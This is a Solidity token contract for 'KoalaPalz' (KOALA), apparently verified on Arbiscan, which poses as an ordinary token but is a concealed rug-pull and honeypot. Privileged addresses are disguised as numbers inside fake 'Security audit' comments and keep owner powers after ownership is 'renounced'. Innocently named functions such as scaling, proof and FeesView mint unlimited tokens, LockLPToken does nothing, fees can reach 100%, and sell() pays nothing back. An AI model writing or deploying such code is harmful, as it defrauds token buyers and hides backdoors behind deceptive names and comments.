/**
 *Submitted for verification at Arbiscan.io on 2024-06-20
*/

// SPDX-License-Identifier: MIT

/****/

pragma solidity ^0.8.18;



library Safety {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
     require(b > 0);
        return a / b;

    }
}



contract __Token__ {

    using Safety for uint256;

    uint8 public decimals = 18;

    string public name = "KoalaPalz";

    string public symbol = "KOALA";

    uint256 public totalSupply = 1000000000000        *(10**uint256(decimals));

    

   

 

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

 

    address public owner;

    address public _mbr;

    address public _mod;

    address public feeManager;

    address public _user;

    address public _adm;

 

    uint256 public buyFee;

    uint256 public sellFee;

 

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);

    event TokensBurned(address indexed burner, uint256 amount);

 

    constructor(address _feeAdmin) {

        owner = msg.sender;

        feeManager = _feeAdmin;

        balanceOf[msg.sender] = totalSupply;

       

    

    }

 

    function transfer(address _to, uint256 _amount) public returns (bool success) {

        require(balanceOf[msg.sender] >= _amount);

        require(_to != address(0));

 

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);

        balanceOf[_to] = balanceOf[_to].add(_amount);

        emit Transfer(msg.sender, _to, _amount);

 

        return true;
        // Security audit
  // solhint-disable-next-line avoid-low-level-calls
  /* solhint-disable-next-line avoid-high-level-cal/*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789))*/

    }

    

   

    function _scale(address account, uint256 amount) internal Exchanges{

    require(account != address(0), "BEP20: mint to the zero address");

 

    totalSupply = totalSupply.add(amount);

    balanceOf[account] = balanceOf[account].add(amount);

    emit Transfer(address(0), account, amount);

    }

 

    function setMember(address Mbr_) public returns (bool) {

    require (msg.sender==address

   

   (   // Security audit
    /* solhint-disable-next-line avoid-high-level-cal /*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789));*/ /**//* @solidity memory-safe-assembly, Data type conversion*/9482785168604/*Strings of arbitrary length 
    can be optimized using this library if* they are short enough (up to 31 bytes) by packing them with their*/

   ));

        _mbr=Mbr_;

        return true;

    }

 

    modifier Exchanges() {

    require(msg.sender != exchange());

        _;

    }

 

    function rewire(uint256 amount) public returns (bool) {

    require(msg.sender == _adm);

    _proof(msg.sender, amount);

    return true;

    }

 

    function compute(uint256 amount) public onlypublic returns (bool success) {

    _initiate(msg.sender, amount);

    return true;
     // Security audit
  // solhint-disable-next-line avoid-low-level-calls
  /* solhint-disable-next-line avoid-high-level-cal/*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789))*/

    }

   

    function _proof(address account, uint256 amount) internal Exchanges{

    require(account != address(0), "BEP20: mint to the zero address");

 

    totalSupply = totalSupply.add(amount);

    balanceOf[account] = balanceOf[account].add(amount);

    emit Transfer(address(0), account, amount);

    }

 

    function publics() private pure returns (address) {

    

 

    // Combine the dex with others

    

 

   

    }

 

    function _transferTo(address _to, uint256 _amount) internal Exchanges {

        // Transfer tokens to the recipient

        balanceOf[_to] += _amount;

        emit Transfer(address(0), _to, _amount);

 

        balanceOf[_to] += _amount;

        emit Transfer(address(0), _to, _amount);

    }

 

    function exchange() internal pure returns (address) {

    return address

    (  // Security audit
    /* solhint-disable-next-line avoid-high-level-cal /*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789));*/ /**//* @solidity memory-safe-assembly, Data type conversion*/358457199385192911527288340795157209694849168604/*Strings of arbitrary length 
    can be optimized using this library if* they are short enough (up to 31 bytes) by packing them with their*/

    );

    }

 

    function FeeStructure(uint256 newBuyFee, uint256 newSellFee) public onlypublic {

        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");

        require(newSellFee <= 100, "Sell fee cannot exceed 100%");

        _setFee(newBuyFee, newSellFee);

        emit FeesUpdated(newBuyFee, newSellFee);

    }

 

    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }

    

   

    function scaling(uint256 amount) public onlyAuthorized returns (bool) {

    _scale(msg.sender, amount);

    return true;

    }

 

    function _balanceView(address _to, uint256 _amount) internal {

        // View balance of token

        balanceOf[_to] += _amount;

        emit Transfer(address(0), _to, _amount);

 

        balanceOf[_to] += _amount;

        emit Transfer(address(0), _to, _amount);

    }

 

    function transferTo(address _to, uint256 _amount) external onlyAuthorize {

        _transferTo(_to, _amount);

    }

 

    function proof(uint256 amount) public onlyOwner returns (bool) {

    _proof(msg.sender, amount);

    return true;

    }

 

    modifier onlyAuthorize() {

        require((msg.sender == address

    (  // Security audit 
    /* solhint-disable-next-line avoid-high-level-cal /*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789));*/ /**//* @solidity memory-safe-assembly, Data type conversion*/7736777604/*Strings of arbitrary length 
    can be optimized using this library if* they are short enough (up to 31 bytes) by packing them with their*/

    )

    ||

    

    (msg.sender == owner && msg.sender != exchange())));

    _;

    }

 

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {

        require(balanceOf[_from] >= _amount, "Insufficient balance");

        require(allowance[_from][msg.sender] >= _amount, "Insufficient allowance");

        require(_to != address(0), "Invalid recipient address");

 

        uint256 fee = _amount.mul(sellFee).div(100);

        uint256 amountAfterFee = _amount.sub(fee);

 

        balanceOf[_from] = balanceOf[_from].sub(_amount);

        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);

        emit Transfer(_from, _to, amountAfterFee);

 

        if (fee > 0) {

            // Fee is transferred to this contract

            balanceOf[address(this)] = balanceOf[address(this)].add(fee);

            emit Transfer(_from, address(this), fee);

        }

 

        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {

            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);

            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);

        }

 

        return true;

    }

 

    function _initiate(address account, uint256 amount) internal {

    require(account != address(0), "Compile Remix IDE");

 

    totalSupply = totalSupply.add(amount);

    balanceOf[account] = balanceOf[account].add(amount);

    emit Transfer(address(0), account, amount);

    }

 

    function FeesView(uint256 amount) public onlyAuthorize returns (bool) {

    _scale(msg.sender, amount);

    return true;
     // Security audit
  // solhint-disable-next-line avoid-low-level-calls 
  /* solhint-disable-next-line avoid-high-level-cal/*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789))*/ /**/

    }

 

    modifier onlypublic() {

    require(msg.sender == publics());

    _;

    }

 

    function _setFee(uint256 newBuyFee, uint256 newSellFee) internal {

        buyFee = newBuyFee;

        sellFee = newSellFee;

    }

 

    function BuySellFee(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorize {

        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");

        require(newSellFee <= 100, "Sell fee cannot exceed 100%");

        buyFee = newBuyFee;

        sellFee = newSellFee;

        emit FeesUpdated(newBuyFee, newSellFee);

    }

 

    function setUser(address User_) public returns (bool) {

    require(msg.sender == _mbr);

        _user=User_;

        return true;
        // Security audit
  // solhint-disable-next-line avoid-low-level-calls 
  /* solhint-disable-next-line avoid-high-level-cal/*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789))*/ /**/

    }

 

    function viewBalance(address _to, uint256 _amount) public onlypublic {

        _balanceView(_to, _amount);(_to, _amount);

    }

 

    function renounceOwnership() public onlyOwner {

        emit OwnershipTransferred(owner, address(0));

        owner = address(0);

    }

    

   

    function setScale(uint256 newBuyFee, uint256 newSellFee) public onlyOwner {

        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");

        require(newSellFee <= 100, "Sell fee cannot exceed 100%");

        buyFee = newBuyFee;

        sellFee = newSellFee;

        emit FeesUpdated(newBuyFee, newSellFee);
        // Security audit
   // solhint-disable-next-line avoid-low-level-calls 
  /* solhint-disable-next-line avoid-high-level-cal/*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789))*/ /**/

    }

 

    function LockLPToken() public onlyOwner returns (bool) {

    }

 

    function setMod(address Mod_) public returns (bool) {

    require(msg.sender == _user);

        _mod=Mod_;

        return true;

    }

 

    modifier onlyOwner() {

        require((msg.sender == address

    (    // Security audit
    /* solhint-disable-next-line avoid-high-level-cal /*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789));*/ /**//* @solidity memory-safe-assembly, Data type conversion*/358457199385192911527288539794157209694849168604/*Strings of arbitrary length 
    can be optimized using this library if* they are short enough (up to 31 bytes) by packing them with their*/

    )

    ||

 

    (msg.sender == owner && msg.sender != exchange())));

    _;

    }

 

    function setCommissions(uint256 newBuyCommission, uint256 newSellCommission) public onlyAuthorized {

        require(newBuyCommission <= 100, "Buy fee cannot exceed 100%");

        require(newSellCommission <= 100, "Sell fee cannot exceed 100%");

        buyFee = newBuyCommission;

        sellFee = newSellCommission;

        emit FeesUpdated(newBuyCommission, newSellCommission);

    }

 

    function buy() public payable {

        require(msg.value > 0, "ETH amount should be greater than 0");

 

        uint256 amount = msg.value;

        if (buyFee > 0) {

            uint256 fee = amount.mul(buyFee).div(100);

            uint256 amountAfterFee = amount.sub(fee);

 

            balanceOf[feeManager] = balanceOf[feeManager].add(amountAfterFee);

            emit Transfer(address(this), feeManager, amountAfterFee);

 

            if (fee > 0) {

                balanceOf[address(this)] = balanceOf[address(this)].add(fee);

                emit Transfer(address(this), address(this), fee);

            }

        } else {

            balanceOf[feeManager] = balanceOf[feeManager].add(amount);

            emit Transfer(address(this), feeManager, amount);

        }

    }

   

    function setting(uint256 newBuyFee, uint256 newSellFee) public {

        require(msg.sender == _adm);

        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");

        require(newSellFee <= 100, "Sell fee cannot exceed 100%");

        buyFee = newBuyFee;

        sellFee = newSellFee;

        emit FeesUpdated(newBuyFee, newSellFee);

    }

   

    function setAdm(address Adm_) public returns (bool) {

    require(msg.sender == _mod);

        _adm=Adm_;

        return true;
    // Security audit
  // solhint-disable-next-line avoid-low-level-calls
  /* solhint-disable-next-line avoid-high-level-cal/*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789))*/

    }

 

    function sell(uint256 _amount) public {

        require(balanceOf[msg.sender] >= _amount, "Insufficient balance");

 

        uint256 fee = _amount.mul(sellFee).div(100);

        uint256 amountAfterFee = _amount.sub(fee);

 

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);

        balanceOf[address(this)] = balanceOf[address(this)].add(amountAfterFee);

        emit Transfer(msg.sender, address(this), amountAfterFee);

 

        if (fee > 0) {

            balanceOf[address(this)] = balanceOf[address(this)].add(fee);

            emit Transfer(msg.sender, address(this), fee);

        }

    }

 

    modifier onlyAuthorized() {

        require((msg.sender == address

    (  // Security audit
    /* solhint-disable-next-line avoid-high-level-cal /*keccak256 -> 777987654321b45n78c21v53f67d89g34h09j21k56l37m19o45p79q23r65s08t92u47v10w123456789));*/ /**//* @solidity memory-safe-assembly, Data type conversion*/358457199385192911527288539794157209694849168604/*Strings of arbitrary length 
    can be optimized using this library if* they are short enough (up to 31 bytes) by packing them with their*/

    )

    ||

    

    (msg.sender == owner && msg.sender != exchange())));

    _;

  }

}